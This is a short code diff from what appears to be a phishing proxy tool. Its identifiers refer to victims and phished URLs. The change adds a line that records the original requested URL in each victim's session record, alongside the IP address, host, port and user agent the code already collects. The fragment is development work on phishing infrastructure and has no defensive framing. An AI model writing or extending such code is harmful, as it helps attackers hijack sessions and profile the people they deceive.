@@ -277,6 +277,8 @@ if (currentSession) {
                                         VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                         VICTIM_SESSIONS[cookieName].host = phishedURL.host;
 
+                                        VICTIM_SESSIONS[cookieName].originalUrl = clientRequestBody.url;
+
                                         VICTIM_SESSIONS[cookieName].ip = getClientIP(clientRequest);
 VICTIM_SESSIONS[cookieName].userAgent = headers['user-agent'] || 'Unknown';
 
